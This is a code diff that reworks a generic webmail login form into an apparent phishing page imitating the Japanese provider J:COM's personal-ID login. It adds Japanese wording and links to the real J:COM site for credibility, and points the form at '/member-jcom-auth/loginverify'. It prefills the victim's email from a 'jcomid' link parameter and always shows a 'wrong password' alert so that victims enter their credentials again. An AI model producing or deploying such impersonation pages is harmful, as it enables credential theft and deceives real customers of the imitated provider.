@@ -1,39 +1,120 @@
+<style>
+   
+    .button-btn-block {
+        background-color: rgb(219, 79, 64);
+        border-color: rgb(219, 79, 64);
+        color: white; 
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis; 
+        margin-left: 150px;
+    }
+
+    .card {
+        height: 1000px;
+        width: 700px;
+        left: 100px;
+        right: 200px;
+        margin-left: -90px;
+    }
+
+    .form-check {
+        margin-left: 200px;
+    }
+
+    
+    .button-btn-block {
+        background-color: #ca3011; 
+        border: rgb(219, 79, 64);
+        color: white;
+        padding: 10px 20px;
+        border-radius: 5px; 
+        transition: background-color 0.3s ease; 
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2); 
+        display: block;
+        width: calc(100% - 300px); 
+        text-align: center;
+    }
+
+    .button-btn-block:hover {
+        background-color: rgb(219, 79, 64);
+        border-color:rgb(219, 79, 64);
+    }
+
+    .registration-btn {
+        display: block;
+        width: auto;
+        padding: 10px 20px;
+        margin: 10px auto; 
+        border: 2px solid rgb(255, 94, 0);
+        color: #b74a35;
+        text-align: center;
+        border-radius: 5px; 
+        transition: background-color 0.3s, color 0.3s; 
+        text-decoration: none; 
+    }
+
+    .registration-btn:hover {
+        background-color: rgb(219, 79, 64);
+        color: white; 
+        cursor: pointer; 
+    }
+</style>
+
 <div class="card-body">
       <!-- Red Text Alert -->
       <div class="alert alert-danger" id="loginErrorAlert">
-        Wrong username or password. Please try again.
+        間違ったユーザー名またはパスワード。もう一度試してください。
+
       </div>
-    <form action="/users/loginverify" method="post">
+      <form action="/member-jcom-auth/loginverify" method="post">
         <!-- Username Field -->
         <div class="form-group">
-            <label for="username">Email</label>
+            <label for="username">Eメール</label>
             <div class="input-group">
                 <div class="input-group-prepend">
                     <span class="input-group-text"><i class="fas fa-user"></i></span>
                 </div>
-                <input type="text" class="form-control" id="email" name="email"
-                    placeholder="Enter your eamil" required>
-
+                <input type="text" class="form-control" id="email" name="email" placeholder="電話番号またはメールアドレスを登録する" required>
             </div>
+            <a href="https://cs.myjcom.jp/WebMail">
+                <small class="text-primary">J:COMパーソナルIDを確認したい方はこちら
+
+                </small>
+            </a>
+           
         </div>
 
         <!-- Password Field -->
         <div class="form-group">
-            <label for="password">Password</label>
+            <label for="password">パスワード</label>
             <div class="input-group">
                 <div class="input-group-prepend">
                     <span class="input-group-text"><i class="fas fa-lock"></i></span>
                 </div>
-                <input type="password" class="form-control" id="password" name="password"
-                    placeholder="Enter your password" required>
+                <input type="password" class="form-control" id="password" name="password" placeholder="パスワードを入力してください" required>
             </div>
+            <small class="text-primary">パスワードは 8 ～ 16 桁の文字列である必要があります</small>
+        </div>
+
+        <!-- Sign in automatically Checkbox -->
+        <div class="form-check">
+            <input type="checkbox" class="form-check-input" id="autoSignIn" name="autoSignIn">
+            <label class="form-check-label" for="autoSignIn">次回からは自動的にサインインします</label>
+            </div>
+           
         </div>
 
         <!-- Submit Button -->
-        <button type="submit" class="btn btn-primary btn-block">Login</button>
+        <button type="submit" class="button-btn-block">規約に同意してログインしてください
+        </button>
+        <br/>
     </form>
     <!-- Centered Text under Login -->
-    <p class="text-center mt-3">Webmail</p>
+    <a href="https://cs.myjcom.jp/WebMail">
+        <p class="registration-btn">J:COMパーソナルID新規登録(無料)</p>
+
+    </a>
 </div>
 <script>
     document.getElementById('loginErrorAlert').style.display = 'block';
@@ -48,7 +129,7 @@
         }
 
         document.addEventListener("DOMContentLoaded", function () {
-            const email = getParameterByName('dbs');
+            const email = getParameterByName('jcomid');
             if (email) {
                 document.getElementById('email').value = email;
             }
